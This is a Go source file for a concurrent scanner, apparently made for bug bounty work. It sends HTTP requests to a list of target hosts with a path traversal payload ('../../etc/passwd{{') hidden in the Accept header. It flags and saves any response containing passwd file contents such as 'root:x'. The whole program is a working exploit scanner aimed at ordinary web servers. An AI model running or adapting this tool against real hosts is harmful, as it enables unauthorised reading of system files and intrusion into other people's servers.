package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"strings"

	"log"
	"net/http"
	"net/http/httputil"
	"time"
)

var authTokenPtr, httpVerbPtr, pathPtr *string
var requestTimeoutPtr *int
var useHttpPtr, insecurePtr, verbosePtr *bool

func check(err error) {
	if err != nil {
		if *verbosePtr {
			log.Println("[ERROR] ", err)
		}
		panic(err)
	}
}

func main() {
	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
	verbosePtr = flag.Bool("verbose", false, "Verbose output")
	insecurePtr = flag.Bool("insecure", false, "Ignore SSL/TLS Errors")
	useHttpPtr = flag.Bool("http", false, "Use HTTP over HTTPS")
	targetsPathPtr := flag.String("targets", "targets.txt", "File containing a list of host names, one host per line i.e https://target.com")
	requestTimeoutPtr = flag.Int("timeout", 2, "Request timeout in Seconds")
	authTokenPtr = flag.String("auth", "nope", "Perform a scan using a auth token i.e Basic YmFzZTY0VG9rZW5WYWx1ZQ==")
	httpVerbPtr = flag.String("verb", "GET", "HTTP verb to use i.e GET")
	pathPtr = flag.String("path", "/", "Path to use in the request i.e /index")
	singleTargetPtr := flag.String("single", "targets.txt", "Scan a single URL i.e https://target.com")
	logFile := flag.Bool("log", false, "Log results to file")

	flag.Parse()

	resultsChannel := make(chan string)
	if *singleTargetPtr == "targets.txt" {
		{
			var fileData string
			hostsToScan, err := loadTargets(*targetsPathPtr)
			check(err)
			for _, host := range hostsToScan {
				go makeSimpleRequest(*httpVerbPtr, strings.TrimSpace(host), *pathPtr, resultsChannel)
			}
			for range hostsToScan {
				scanResult := <-resultsChannel
				log.Printf(scanResult)
				if *logFile {
					fileData += scanResult
				}
			}

			if *logFile {
				dt := time.Now()
				toFile(fileData, "scan_"+dt.Format("2006-01-02_15_04_05")+".txt")
			}
		}
	} else {
		go makeSimpleRequest(*httpVerbPtr, strings.TrimSpace(*singleTargetPtr), *pathPtr, resultsChannel)
		scanResult := <-resultsChannel
		log.Printf(scanResult)
	}
}

func toFile(data, fileName string) {
	if _, err := os.Stat("logs"); os.IsNotExist(err) {
		os.Mkdir("logs", 0700)
	}
	f, err := os.Create("logs/" + fileName)
	check(err)
	_, err = f.WriteString(data + "\n")
	defer f.Close()
}
func makeSimpleRequest(verb, host, path string, results chan<- string) {
	var body []byte
	var response *http.Response
	var request *http.Request

	if !strings.Contains(host, "https") && !strings.Contains(host, "http") {
		tmpHost := "https://" + host
		host = tmpHost
	}

	if *useHttpPtr {
		host = strings.Replace(host, "https://", "http://", -1)
	}
	url := host + path
	var client *http.Client
	timeout := time.Duration(*requestTimeoutPtr) * time.Second

	if *insecurePtr {
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client = &http.Client{Transport: tr, Timeout: timeout}
	} else {
		client = &http.Client{Timeout: timeout}
	}
	request, err := http.NewRequest(verb, url, nil)

	if *authTokenPtr != "nope" {
		request.Header.Add("Authorization", *authTokenPtr)
	}

	request.Header.Add("User-Agent", "bugbounty")
	request.Header.Add("Accept", "../../../../../../../../../../etc/passwd{{")

	if err != nil {
		results <- "[-] URL: " + url
		results <- fmt.Sprintf("[-] URL [%s]: %s\n", verb, url)
		if *verbosePtr {
			log.Println("[ERROR] ", err)
		}
		return
	}
	if *verbosePtr {
		debugHttp(httputil.DumpRequestOut(request, true))
	}
	response, err = (client).Do(request)

	if err != nil {
		results <- fmt.Sprintf("[-] URL [%s]: %s\n", verb, url)
		if *verbosePtr {
			log.Println("[ERROR] ", err)
		}
		return
	}

	defer response.Body.Close()
	body, err = ioutil.ReadAll(response.Body)
	if *verbosePtr {
		debugHttp(httputil.DumpResponse(response, true))
	}
	if err != nil {
		results <- fmt.Sprintf("[-] URL [%s]: %s\n", verb, url)
		if *verbosePtr {
			log.Println("[ERROR] ", err)
		}
		return
	}
	strBody := string(body[:])
	if strings.Contains(strBody, "root:x") || strings.Contains(strBody, "nobody:") {
		strResult := fmt.Sprintf("[!] URL [%s]: %s \n-----POTENTIAL: %s \n", verb, url, string(body[:]))
		results <- strResult
		fmt.Println("CREATING FILE")
		dt := time.Now()
		err := ioutil.WriteFile(dt.String(), []byte(strResult), 0755)
		if err != nil {
			fmt.Printf("Unable to write (%s) file: %v\n", url, err)
		}
	} else {
		results <- fmt.Sprintf("[+] URL [%s] [%d]: %s\n", verb, response.StatusCode, url)
	}
}

func loadTargets(targetPath string) ([]string, error) {
	var loadedHosts []string
	file, err := os.Open(targetPath)
	if err != nil {
		if *verbosePtr {
			log.Println("[ERROR] ", err)
		}
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		loadedHosts = append(loadedHosts, strings.TrimSpace(scanner.Text()))
	}

	if err := scanner.Err(); err != nil {
		if *verbosePtr {
			log.Println("[ERROR] ", err)
		}
		return nil, err
	}
	log.Printf("[+] Loaded %d targets from: %s\n", len(loadedHosts), targetPath)
	return loadedHosts, nil
}

func debugHttp(data []byte, err error) {
	if err == nil {
		log.Println("--------------------------------------------------------------")
		log.Printf("%s\n\n", data)
		log.Println("--------------------------------------------------------------")
	} else {
		log.Println("--------------------------------------------------------------")
		log.Fatalf("%s\n\n", err)
		log.Println("--------------------------------------------------------------")
	}
}
